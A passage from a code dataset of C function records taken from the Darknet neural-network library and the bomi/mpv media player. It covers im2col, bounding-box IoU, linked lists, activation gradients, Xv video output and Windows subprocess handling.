\u4f9d\u6b21\u7c7b\u63a8\uff1b\u52a0\u4e0ah*stride\u662f\u5bf9\u5377\u79ef\u6838\u8fdb\u884c\u884c\u79fb\u4f4d\u64cd\u4f5c\uff0c\u6bd4\u5982\u5377\u79ef\u6838\u4ece\u56fe\u50cf(0,0)\u4f4d\u7f6e\u5f00\u59cb\u505a\u5377\u79ef\uff0c\u90a3\u4e48\u6700\u5148\u5f00\u59cb\u6d89\u53ca(0,0)~(3,3)\n                // \u4e4b\u95f4\u7684\u50cf\u7d20\u503c\uff0c\u82e5stride=2\uff0c\u90a3\u4e48\u5377\u79ef\u6838\u8fdb\u884c\u4e00\u6b21\u884c\u79fb\u4f4d\u65f6\uff0c\u4e0b\u4e00\u884c\u7684\u5377\u79ef\u64cd\u4f5c\u662f\u4ece\u5143\u7d20(2,0)\uff082\u4e3a\u56fe\u50cf\u884c\u53f7\uff0c0\u4e3a\u5217\u53f7\uff09\u5f00\u59cb\n                int im_row = h_offset + h * stride;\n\t\t\t\t// \u5bf9\u4e8e3*3\u7684\u5377\u79ef\u6838\uff0cw_offset\u53d6\u503c\u4e5f\u4e3a0,1,2\uff0c\u5f53w_offset\u53d61\u65f6\uff0c\u4f1a\u63d0\u53d6\u51fa\u6240\u6709\u4e0e\u5377\u79ef\u6838\u4e2d\u7b2c2\u5217\u5143\u7d20\u8fdb\u884c\u8fd0\u7b97\u7684\u50cf\u7d20\uff0c\n                // \u5b9e\u9645\u5728\u505a\u5377\u79ef\u64cd\u4f5c\u65f6\uff0c\u5377\u79ef\u6838\u5bf9\u56fe\u50cf\u9010\u884c\u626b\u63cf\u505a\u5377\u79ef\uff0c\u52a0\u4e0aw*stride\u5c31\u662f\u4e3a\u4e86\u505a\u5217\u79fb\u4f4d\uff0c\n                // \u6bd4\u5982\u524d\u4e00\u6b21\u5377\u79ef\u5176\u5b9e\u50cf\u7d20\u5143\u7d20\u4e3a(0,0)\uff0c\u82e5stride=2,\u90a3\u4e48\u4e0b\u6b21\u5377\u79ef\u5143\u7d20\u8d77\u59cb\u50cf\u7d20\u4f4d\u7f6e\u4e3a(0,2)\uff080\u4e3a\u884c\u53f7\uff0c2\u4e3a\u5217\u53f7\uff09\n                int im_col = w_offset + w * stride;\n\t\t\t\t// col_index\u4e3a\u91cd\u6392\u540e\u56fe\u50cf\u4e2d\u7684\u50cf\u7d20\u7d22\u5f15\uff0c\u7b49\u4e8ec * height_col * width_col + h * width_col +w\uff08\u8fd8\u662f\u6309\u884c\u5b58\u50a8\uff0c\u6240\u6709\u901a\u9053\u518d\u5e76\u6210\u4e00\u884c\uff09\uff0c\n                // \u5bf9\u5e94\u7b2cc\u901a\u9053\uff0ch\u884c\uff0cw\u5217\u7684\u5143\u7d20\n                int col_index = (c * height_col + h) * width_col + w;\n\t\t\t\t// im2col_get_pixel\u51fd\u6570\u83b7\u53d6\u8f93\u5165\u56fe\u50cfdata_im\u4e2d\u7b2cc_im\u901a\u9053\uff0cim_row,im_col\u7684\u50cf\u7d20\u503c\u5e76\u8d4b\u503c\u7ed9\u91cd\u6392\u540e\u7684\u56fe\u50cf\uff0c\n                // height\u548cwidth\u4e3a\u8f93\u5165\u56fe\u50cfdata_im\u7684\u771f\u5b9e\u9ad8\u3001\u5bbd\uff0cpad\u4e3a\u56db\u5468\u88650\u7684\u957f\u5ea6\uff08\u6ce8\u610fim_row,im_col\u662f\u88650\u4e4b\u540e\u7684\u884c\u5217\u53f7\uff0c\n                // \u4e0d\u662f\u771f\u5b9e\u8f93\u5165\u56fe\u50cf\u4e2d\u7684\u884c\u5217\u53f7\uff0c\u56e0\u6b64\u9700\u8981\u51cf\u53bbpad\u83b7\u53d6\u771f\u5b9e\u7684\u884c\u5217\u53f7\uff09\n                data_col[col_index] = im2col_get_pixel(data_im, height, width, channels,\n                        im_row, im_col, c_im, pad);\n            }\n        }\n    }\n}", "path": "src\\im2col.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// https://github.com/BVLC/caffe/blob/master/src/caffe/util/im2col.cpp\n", "func_signal": "void im2col_cpu_ext(const float* data_im, const int channels,\n    const int height, const int width, const int kernel_h, const int kernel_w,\n    const int pad_h, const int pad_w,\n    const int stride_h, const int stride_w,\n    const int dilation_h, const int dilation_w,\n    float* data_col)", "code": "{\n    const int output_h = (height + 2 * pad_h -\n        (dilation_h * (kernel_h - 1) + 1)) / stride_h + 1;\n    const int output_w = (width + 2 * pad_w -\n        (dilation_w * (kernel_w - 1) + 1)) / stride_w + 1;\n    const int channel_size = height * width;\n    int channel, kernel_row, kernel_col, output_rows, output_col;\n    for (channel = channels; channel--; data_im += channel_size) {\n        for (kernel_row = 0; kernel_row < kernel_h; kernel_row++) {\n            for (kernel_col = 0; kernel_col < kernel_w; kernel_col++) {\n                int input_row = -pad_h + kernel_row * dilation_h;\n                for (output_rows = output_h; output_rows; output_rows--) {\n                    if (!is_a_ge_zero_and_a_lt_b(input_row, height)) {\n                        for (output_col = output_w; output_col; output_col--) {\n                            *(data_col++) = 0;\n                        }\n                    }\n                    else {\n                        int input_col = -pad_w + kernel_col * dilation_w;\n                        for (output_col = output_w; output_col; output_col--) {\n                            if (is_a_ge_zero_and_a_lt_b(input_col, width)) {\n                                *(data_col++) = data_im[input_row * width + input_col];\n                            }\n                            else {\n                                *(data_col++) = 0;\n                            }\n                            input_col += stride_w;\n                        }\n                    }\n                    input_row += stride_h;\n                }\n            }\n        }\n    }\n}", "path": "src\\im2col.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// https://github.com/Zzh-tju/DIoU-darknet\n// https://arxiv.org/abs/1911.08287\n", "func_signal": "float box_diou(box a, box b)", "code": "{\n    boxabs ba = box_c(a, b);\n    float w = ba.right - ba.left;\n    float h = ba.bot - ba.top;\n    float c = w * w + h * h;\n    float iou = box_iou(a, b);\n    if (c == 0) {\n        return iou;\n    }\n    float d = (a.x - b.x) * (a.x - b.x) + (a.y - b.y) * (a.y - b.y);\n    float u = pow(d / c, 0.6);\n    float diou_term = u;\n#ifdef DEBUG_PRINTS\n    printf(\"  c: %f, u: %f, riou_term: %f\\n\", c, u, diou_term);\n#endif\n    return iou - diou_term;\n}", "path": "src\\box.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// Marsaglia's xorshf96 generator: period 2^96-1\n", "func_signal": "unsigned int random_gen_fast(void)", "code": "{\n    unsigned int t;\n    x ^= x << 16;\n    x ^= x >> 5;\n    x ^= x << 1;\n\n    t = x;\n    x = y;\n    y = z;\n    z = t ^ x ^ y;\n\n    return z;\n}", "path": "src\\utils.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// indicies to skip is a bit array\n", "func_signal": "float mag_array_skip(float *a, int n, int * indices_to_skip)", "code": "{\n    int i;\n    float sum = 0;\n    for (i = 0; i < n; ++i) {\n        if (indices_to_skip[i] != 1) {\n            sum += a[i] * a[i];\n        }\n    }\n    return sqrt(sum);\n}", "path": "src\\utils.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// representation from x, y, w, h to top, left, bottom, right\n", "func_signal": "boxabs to_tblr(box a)", "code": "{\n    boxabs tblr = { 0 };\n    float t = a.y - (a.h / 2);\n    float b = a.y + (a.h / 2);\n    float l = a.x - (a.w / 2);\n    float r = a.x + (a.w / 2);\n    tblr.top = t;\n    tblr.bot = b;\n    tblr.left = l;\n    tblr.right = r;\n    return tblr;\n}", "path": "src\\box.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "//\u94fe\u8868\u7684\u5220\u9664\u64cd\u4f5c\uff0c\u5220\u9664\u5c3e\u6307\u9488\u6240\u6307\u8282\u70b9\uff0c\u5373\u6700\u540e\u4e00\u4e2a\u8282\u70b9\n", "func_signal": "void *list_pop(list *l)", "code": "{\n\t// \u5982\u679c\u94fe\u8868\u4e3a\u7a7a\n    if(!l->back) return 0;\n\t// node *b \u6307\u5411\u6700\u540e\u4e00\u4e2a\u8282\u70b9\n    node *b = l->back;\n    void *val = b->val;\n\t// \u66f4\u65b0\u5c3e\u6307\u9488\uff0c\u5c3e\u6307\u9488\u6307\u5411b\u7684\u524d\u4e00\u8282\u70b9\uff0c\u5373\u5012\u6570\u7b2c\u4e8c\u8282\u70b9\u3002\n    l->back = b->prev;\n\t// \u5982\u679c\u5012\u6570\u7b2c\u4e8c\u8282\u70b9\u5b58\u5728\n    if(l->back) l->back->next = 0; //\u5c3e\u6307\u9488next\u7f6e\u4e3anull\n    // \u91ca\u653e\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u5b58\u50a8\u7a7a\u95f4\n\tfree(b);\n    --l->size; // \u94fe\u8868\u957f\u5ea6 -1\n\n    return val;// \u8fd4\u56de\u88ab\u5220\u9664\u8282\u70b9\u4fdd\u5b58\u7684\u503c\n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// where c is the smallest box that fully encompases a and b\n", "func_signal": "boxabs box_c(box a, box b)", "code": "{\n    boxabs ba = { 0 };\n    ba.top = fmin(a.y - a.h / 2, b.y - b.h / 2);\n    ba.bot = fmax(a.y + a.h / 2, b.y + b.h / 2);\n    ba.left = fmin(a.x - a.w / 2, b.x - b.w / 2);\n    ba.right = fmax(a.x + a.w / 2, b.x + b.w / 2);\n    return ba;\n}", "path": "src\\box.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// \u5bf9\u94fe\u8868\u6240\u6709\u8282\u70b9\u7684\u503c\u3010\u8282\u70b9\u4e2d\u503c\u4e3avoid \u7c7b\u578b\u6307\u9488\u3011 \u7684\u5b58\u50a8\u7a7a\u95f4\u91ca\u653e\n", "func_signal": "void free_list_contents(list *l)", "code": "{\n    node *n = l->front;\n    while(n){\n        free(n->val);\n        n = n->next;\n    }\n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "/*\n** \u6839\u636e\u4e0d\u540c\u7684\u6fc0\u6d3b\u51fd\u6570\u6c42\u53d6\u5bf9\u8f93\u5165\u7684\u68af\u5ea6\uff08\u5bfc\u6570\uff09\n** \u8f93\u5165\uff1a x    \u6fc0\u6d3b\u51fd\u6570\u63a5\u6536\u7684\u8f93\u5165\u503c\n**       a    \u6fc0\u6d3b\u51fd\u6570\u7c7b\u578b\uff0c\u5305\u62ec\u7684\u6fc0\u6d3b\u51fd\u6570\u7c7b\u578b\u89c1activations.h\u4e2d\u679a\u4e3e\u7c7b\u578bACTIVATION\u7684\u5b9a\u4e49\n** \u8f93\u51fa\uff1a \u6fc0\u6d3b\u51fd\u6570\u5173\u4e8e\u8f93\u5165x\u7684\u5bfc\u6570\u503c\n*/\n", "func_signal": "float gradient(float x, ACTIVATION a)", "code": "{\n\t// \u4ee5\u4e0b\u5206\u522b\u6c42\u53d6\u5404\u79cd\u6fc0\u6d3b\u51fd\u6570\u5bf9\u8f93\u5165\u7684\u5bfc\u6570\u503c\uff0c\u8be6\u89c1\u5404\u4e2a\u5bfc\u6570\u6c42\u53d6\u51fd\u6570\u7684\u5185\u90e8\u6ce8\u91ca\n    switch(a){\n        case LINEAR:\n            return linear_gradient(x);\n        case LOGISTIC:\n            return logistic_gradient(x);\n        case LOGGY:\n            return loggy_gradient(x);\n        case RELU:\n            return relu_gradient(x);\n        case NORM_CHAN:\n            //return relu_gradient(x);\n        case NORM_CHAN_SOFTMAX_MAXVAL:\n            //...\n        case NORM_CHAN_SOFTMAX:\n            printf(\" Error: should be used custom NORM_CHAN or NORM_CHAN_SOFTMAX-function for gradient \\n\");\n            exit(0);\n            return 0;\n        case ELU:\n            return elu_gradient(x);\n        case SELU:\n            return selu_gradient(x);\n        case RELIE:\n            return relie_gradient(x);\n        case RAMP:\n            return ramp_gradient(x);\n        case LEAKY:\n            return leaky_gradient(x);\n        case TANH:\n            return tanh_gradient(x);\n        case PLSE:\n            return plse_gradient(x);\n        case STAIR:\n            return stair_gradient(x);\n        case HARDTAN:\n            return hardtan_gradient(x);\n        case LHTAN:\n            return lhtan_gradient(x);\n    }\n    return 0;\n}", "path": "src\\activations.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// From http://en.wikipedia.org/wiki/Box%E2%80%93Muller_transform\n", "func_signal": "float rand_normal()", "code": "{\n    static int haveSpare = 0;\n    static double rand1, rand2;\n\n    if(haveSpare)\n    {\n        haveSpare = 0;\n        return sqrt(rand1) * sin(rand2);\n    }\n\n    haveSpare = 1;\n\n    rand1 = random_gen() / ((double) RAND_MAX);\n    if(rand1 < 1e-100) rand1 = 1e-100;\n    rand1 = -2 * log(rand1);\n    rand2 = (random_gen() / ((double)RAND_MAX)) * 2.0 * M_PI;\n\n    return sqrt(rand1) * cos(rand2);\n}", "path": "src\\utils.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// \u91ca\u653e\u94fe\u8868\u8282\u70b9\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u4ece\u8282\u70b9n\u5f00\u59cb\u91ca\u653e\uff0c\u4e00\u76f4\u91ca\u653e\u5230\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u3002\n", "func_signal": "void free_node(node *n)", "code": "{\n    node *next;\n    while(n) {\n        next = n->next; // \u83b7\u53d6\u4e0b\u4e00\u8282\u70b9\u5730\u5740\n        free(n); // \u91ca\u653e\u5f53\u524d\u8282\u70b9\u5b58\u50a8\u7a7a\u95f4\n        n = next; //\u66f4\u65b0n\uff0cn\u6307\u5411\u4e0b\u4e00\u8282\u70b9\n    } \n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// https://github.com/Zzh-tju/DIoU-darknet\n// https://arxiv.org/abs/1911.08287\n", "func_signal": "void diounms_sort(detection *dets, int total, int classes, float thresh, NMS_KIND nms_kind, float beta1)", "code": "{\n    int i, j, k;\n    k = total - 1;\n    for (i = 0; i <= k; ++i) {\n        if (dets[i].objectness == 0) {\n            detection swap = dets[i];\n            dets[i] = dets[k];\n            dets[k] = swap;\n            --k;\n            --i;\n        }\n    }\n    total = k + 1;\n\n    for (k = 0; k < classes; ++k) {\n        for (i = 0; i < total; ++i) {\n            dets[i].sort_class = k;\n        }\n        qsort(dets, total, sizeof(detection), nms_comparator_v3);\n        for (i = 0; i < total; ++i)\n        {\n            if (dets[i].prob[k] == 0) continue;\n            box a = dets[i].bbox;\n            for (j = i + 1; j < total; ++j) {\n                box b = dets[j].bbox;\n                if (box_iou(a, b) > thresh && nms_kind == CORNERS_NMS)\n                {\n                    float sum_prob = pow(dets[i].prob[k], 2) + pow(dets[j].prob[k], 2);\n                    float alpha_prob = pow(dets[i].prob[k], 2) / sum_prob;\n                    float beta_prob = pow(dets[j].prob[k], 2) / sum_prob;\n                    //dets[i].bbox.x = (dets[i].bbox.x*alpha_prob + dets[j].bbox.x*beta_prob);\n                    //dets[i].bbox.y = (dets[i].bbox.y*alpha_prob + dets[j].bbox.y*beta_prob);\n                    //dets[i].bbox.w = (dets[i].bbox.w*alpha_prob + dets[j].bbox.w*beta_prob);\n                    //dets[i].bbox.h = (dets[i].bbox.h*alpha_prob + dets[j].bbox.h*beta_prob);\n                    /*\n                    if (dets[j].points == YOLO_CENTER && (dets[i].points & dets[j].points) == 0) {\n                        dets[i].bbox.x = (dets[i].bbox.x*alpha_prob + dets[j].bbox.x*beta_prob);\n                        dets[i].bbox.y = (dets[i].bbox.y*alpha_prob + dets[j].bbox.y*beta_prob);\n                    }\n                    else if ((dets[i].points & dets[j].points) == 0) {\n                        dets[i].bbox.w = (dets[i].bbox.w*alpha_prob + dets[j].bbox.w*beta_prob);\n                        dets[i].bbox.h = (dets[i].bbox.h*alpha_prob + dets[j].bbox.h*beta_prob);\n                    }\n                    dets[i].points |= dets[j].points;\n                    */\n                    dets[j].prob[k] = 0;\n                }\n                else if (box_iou(a, b) > thresh && nms_kind == GREEDY_NMS) {\n                    dets[j].prob[k] = 0;\n                }\n                else {\n                    if (box_diounms(a, b, beta1) > thresh && nms_kind == DIOU_NMS) {\n                        dets[j].prob[k] = 0;\n                    }\n                }\n            }\n\n            //if ((nms_kind == CORNERS_NMS) && (dets[i].points != (YOLO_CENTER | YOLO_LEFT_TOP | YOLO_RIGHT_BOTTOM)))\n            //    dets[i].prob[k] = 0;\n        }\n    }\n}", "path": "src\\box.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// https://github.com/digantamisra98/Mish\n", "func_signal": "void gradient_array_mish(const int n, const float * activation_input, float * delta)", "code": "{\n    int i;\n    #pragma omp parallel for\n    for (i = 0; i < n; ++i) {\n        const float MISH_THRESHOLD = 20.0f;\n\n        // implementation from TensorFlow: https://github.com/tensorflow/addons/commit/093cdfa85d334cbe19a37624c33198f3140109ed\n        // implementation from Pytorch: https://github.com/thomasbrandon/mish-cuda/blob/master/csrc/mish.h#L26-L31\n        float inp = activation_input[i];\n        const float sp = softplus_activate(inp, MISH_THRESHOLD);\n        const float grad_sp = 1 - exp(-sp);\n        const float tsp = tanh(sp);\n        const float grad_tsp = (1 - tsp*tsp) * grad_sp;\n        const float grad = inp * grad_tsp + tsp;\n        delta[i] *= grad;\n\n\n        //float x = activation_input[i];\n        //float d = 2 * expf(x) + expf(2 * x) + 2;\n        //float w = 4 * (x + 1) + 4 * expf(2 * x) + expf(3 * x) + expf(x)*(4 * x + 6);\n        //float derivative = expf(x) * w / (d * d);\n        //delta[i] *= derivative;\n    }\n}", "path": "src\\activations.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// Convert an array of arguments to a properly escaped command-line string\n", "func_signal": "static wchar_t *write_cmdline(void *ctx, char **argv)", "code": "{\n    // argv[0] should always be quoted. Otherwise, arguments may be interpreted\n    // as part of the program name. Also, it can't contain escape sequences.\n    bstr cmdline = {0};\n    bstr_xappend_asprintf(NULL, &cmdline, \"\\\"%s\\\"\", argv[0]);\n\n    for (int i = 1; argv[i]; i++) {\n        bstr_xappend(NULL, &cmdline, bstr0(\" \"));\n        write_arg(&cmdline, argv[i]);\n    }\n\n    wchar_t *wcmdline = mp_from_utf8(ctx, cmdline.start);\n    talloc_free(cmdline.start);\n    return wcmdline;\n}", "path": "src\\mpv\\osdep\\subprocess-win.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Note: REDRAW_FRAME can call this with NULL.\n", "func_signal": "static void draw_image(struct vo *vo, mp_image_t *mpi)", "code": "{\n    struct xvctx *ctx = vo->priv;\n\n    wait_for_completion(vo, ctx->num_buffers - 1);\n\n    struct mp_image xv_buffer = get_xv_buffer(vo, ctx->current_buf);\n    if (mpi) {\n        mp_image_copy(&xv_buffer, mpi);\n    } else {\n        mp_image_clear(&xv_buffer, 0, 0, xv_buffer.w, xv_buffer.h);\n    }\n\n    struct mp_osd_res res = osd_res_from_image_params(vo->params);\n    osd_draw_on_image(vo->osd, res, mpi ? mpi->pts : 0, 0, &xv_buffer);\n\n    if (mpi != ctx->original_image) {\n        talloc_free(ctx->original_image);\n        ctx->original_image = mpi;\n    }\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "/*\n * create and map window,\n * allocate colors and (shared) memory\n */\n", "func_signal": "static int reconfig(struct vo *vo, struct mp_image_params *params, int flags)", "code": "{\n    struct vo_x11_state *x11 = vo->x11;\n    struct xvctx *ctx = vo->priv;\n    int i;\n\n    mp_image_unrefp(&ctx->original_image);\n\n    ctx->image_height = params->h;\n    ctx->image_width  = params->w;\n    ctx->image_format = params->imgfmt;\n\n    if ((ctx->max_width != 0 && ctx->max_height != 0)\n        && (ctx->image_width > ctx->max_width\n            || ctx->image_height > ctx->max_height)) {\n        MP_ERR(vo, \"Source image dimensions are too high: %ux%u (maximum is %ux%u)\\n\",\n               ctx->image_width, ctx->image_height, ctx->max_width,\n               ctx->max_height);\n        return -1;\n    }\n\n    /* check image formats */\n    ctx->xv_format = 0;\n    for (i = 0; i < ctx->formats; i++) {\n        MP_VERBOSE(vo, \"Xvideo image format: 0x%x (%4.4s) %s\\n\",\n                   ctx->fo[i].id, (char *) &ctx->fo[i].id,\n                   (ctx->fo[i].format == XvPacked) ? \"packed\" : \"planar\");\n        if (ctx->fo[i].id == find_xv_format(ctx->image_format))\n            ctx->xv_format = ctx->fo[i].id;\n    }\n    if (!ctx->xv_format)\n        return -1;\n\n    vo_x11_config_vo_window(vo, NULL, flags, \"xv\");\n\n    if (ctx->xv_ck_info.method == CK_METHOD_BACKGROUND)\n        XSetWindowBackground(x11->display, x11->window, ctx->xv_colorkey);\n\n    MP_VERBOSE(vo, \"using Xvideo port %d for hw scaling\\n\", ctx->xv_port);\n\n    // In case config has been called before\n    for (i = 0; i < ctx->num_buffers; i++)\n        deallocate_xvimage(vo, i);\n\n    ctx->num_buffers = ctx->cfg_buffers;\n\n    for (i = 0; i < ctx->num_buffers; i++) {\n        if (!allocate_xvimage(vo, i)) {\n            MP_FATAL(vo, \"could not allocate Xv image data\\n\");\n            return -1;\n        }\n    }\n\n    ctx->current_buf = 0;\n    ctx->current_ip_buf = 0;\n\n    int is_709 = params->colorspace == MP_CSP_BT_709;\n    xv_set_eq(vo, ctx->xv_port, \"bt_709\", is_709 * 200 - 100);\n    read_xv_csp(vo);\n\n    resize(vo);\n\n    return 0;\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Helper method similar to sparse_poll, skips NULL handles\n", "func_signal": "static int sparse_wait(HANDLE *handles, unsigned num_handles)", "code": "{\n    unsigned w_num_handles = 0;\n    HANDLE w_handles[num_handles];\n    int map[num_handles];\n\n    for (unsigned i = 0; i < num_handles; i++) {\n        if (!handles[i])\n            continue;\n\n        w_handles[w_num_handles] = handles[i];\n        map[w_num_handles] = i;\n        w_num_handles++;\n    }\n\n    if (w_num_handles == 0)\n        return -1;\n    DWORD i = WaitForMultipleObjects(w_num_handles, w_handles, FALSE, INFINITE);\n    i -= WAIT_OBJECT_0;\n\n    if (i >= w_num_handles)\n        return -1;\n    return map[i];\n}", "path": "src\\mpv\\osdep\\subprocess-win.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// out_matrix is a reactangular tsize * tsize array, where tsize = (1 << size).\n", "func_signal": "void mp_make_fruit_dither_matrix(float *out_matrix, int size)", "code": "{\n    struct ctx *k = talloc_zero(NULL, struct ctx);\n    makegauss(k, size);\n    makeuniform(k);\n    float invscale = k->size2;\n    for(index_t y = 0; y < k->size; y++) {\n        for(index_t x = 0; x < k->size; x++)\n            out_matrix[x + y * k->size] = k->unimat[XY(k, x, y)] / invscale;\n    }\n    talloc_free(k);\n}", "path": "src\\mpv\\video\\out\\dither.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Create a PROC_THREAD_ATTRIBUTE_LIST that specifies exactly which handles are\n// inherited by the subprocess\n", "func_signal": "static LPPROC_THREAD_ATTRIBUTE_LIST create_handle_list(void *ctx,\n                                                       HANDLE *handles, int num)", "code": "{\n    WINBOOL (WINAPI *pInitializeProcThreadAttributeList)(\n            LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);\n    WINBOOL (WINAPI *pUpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST,\n            DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);\n\n    // Load Windows Vista functions, if available\n    HMODULE kernel32 = GetModuleHandleW(L\"kernel32.dll\");\n    pInitializeProcThreadAttributeList =\n        (WINBOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T))\n        GetProcAddress(kernel32, \"InitializeProcThreadAttributeList\");\n    pUpdateProcThreadAttribute =\n        (WINBOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR,\n                           PVOID, SIZE_T, PVOID, PSIZE_T))\n        GetProcAddress(kernel32, \"UpdateProcThreadAttribute\");\n    if (!pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute)\n        return NULL;\n\n    // Get required attribute list size\n    SIZE_T size = 0;\n    if (!pInitializeProcThreadAttributeList(NULL, 1, 0, &size)) {\n        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)\n            return NULL;\n    }\n\n    // Allocate attribute list\n    LPPROC_THREAD_ATTRIBUTE_LIST list = talloc_size(ctx, size);\n    if (!pInitializeProcThreadAttributeList(list, 1, 0, &size))\n        goto error;\n    talloc_set_destructor(list, delete_handle_list);\n\n    if (!pUpdateProcThreadAttribute(list, 0, PROC_THREAD_ATTRIBUTE_HANDLE_LIST,\n                                    handles, num * sizeof(HANDLE), NULL, NULL))\n        goto error;\n\n    return list;\nerror:\n    talloc_free(list);\n    return NULL;\n}", "path": "src\\mpv\\osdep\\subprocess-win.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Curse whoever had this stupid idea. Curse whoever thought it would be a good\n// idea not to include an emulated lua_cpcall() even more.\n", "func_signal": "static int mp_cpcall (lua_State *L, lua_CFunction func, void *ud)", "code": "{\n    lua_pushcfunction(L, func); // doesn't allocate in 5.2 (but does in 5.1)\n    lua_pushlightuserdata(L, ud);\n    return lua_pcall(L, 1, 0, 0);\n}", "path": "src\\mpv\\player\\lua.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "/* Draw the colorkey on the video window.\n *\n * Draws the colorkey depending on the set method ( colorkey_handling ).\n *\n * Also draws the black bars ( when the video doesn't fit the display in\n * fullscreen ) separately, so they don't overlap with the video area. */\n", "func_signal": "static void xv_draw_colorkey(struct vo *vo, const struct mp_rect *rc)", "code": "{\n    struct xvctx *ctx = vo->priv;\n    struct vo_x11_state *x11 = vo->x11;\n    if (ctx->xv_ck_info.method == CK_METHOD_MANUALFILL ||\n        ctx->xv_ck_info.method == CK_METHOD_BACKGROUND)\n    {\n        if (!x11->vo_gc)\n            return;\n        //less tearing than XClearWindow()\n        XSetForeground(x11->display, x11->vo_gc, ctx->xv_colorkey);\n        XFillRectangle(x11->display, x11->window, x11->vo_gc, rc->x0, rc->y0,\n                       rc->x1 - rc->x0, rc->y1 - rc->y0);\n    }\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Get maximum supported source image dimensions.\n// If querying the dimensions fails, don't change *width and *height.\n", "func_signal": "static void xv_get_max_img_dim(struct vo *vo, uint32_t *width, uint32_t *height)", "code": "{\n    struct xvctx *ctx = vo->priv;\n    XvEncodingInfo *encodings;\n    unsigned int num_encodings, idx;\n\n    XvQueryEncodings(vo->x11->display, ctx->xv_port, &num_encodings, &encodings);\n\n    if (encodings) {\n        for (idx = 0; idx < num_encodings; ++idx) {\n            if (strcmp(encodings[idx].name, \"XV_IMAGE\") == 0) {\n                *width  = encodings[idx].width;\n                *height = encodings[idx].height;\n                break;\n            }\n        }\n    }\n\n    MP_VERBOSE(vo, \"Maximum source image dimensions: %ux%u\\n\", *width, *height);\n\n    XvFreeEncodingInfo(encodings);\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Try to enable vsync for xv.\n// Returns -1 if not available, 0 on failure and 1 on success.\n", "func_signal": "static int xv_enable_vsync(struct vo *vo)", "code": "{\n    struct xvctx *ctx = vo->priv;\n    Atom xv_atom = xv_intern_atom_if_exists(vo, \"XV_SYNC_TO_VBLANK\");\n    if (xv_atom == None)\n        return -1;\n    return XvSetPortAttribute(vo->x11->display, ctx->xv_port, xv_atom, 1)\n           == Success;\n}", "path": "src\\mpv\\video\\out\\vo_xv.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
{"docstring": "// Run the thread_fn in a new thread. Wait until the thread returns, but while\n// waiting, process input and input commands.\n", "func_signal": "int mpctx_run_reentrant(struct MPContext *mpctx, void (*thread_fn)(void *arg),\n                        void *thread_arg)", "code": "{\n    struct wrapper_args args = {mpctx, thread_fn, thread_arg};\n    pthread_mutex_init(&args.mutex, NULL);\n    bool success = false;\n    pthread_t thread;\n    if (pthread_create(&thread, NULL, thread_wrapper, &args))\n        goto done;\n    while (!success) {\n        mp_idle(mpctx);\n\n        if (mpctx->stop_play)\n            mp_cancel_trigger(mpctx->playback_abort);\n\n        pthread_mutex_lock(&args.mutex);\n        success |= args.done;\n        pthread_mutex_unlock(&args.mutex);\n    }\n    pthread_join(thread, NULL);\ndone:\n    pthread_mutex_destroy(&args.mutex);\n    return success ? 0 : -1;\n}", "path": "src\\mpv\\player\\misc.c", "repo_name": "bylee20/bomi", "stars": 426, "license": "other", "language": "c", "size": 42512}
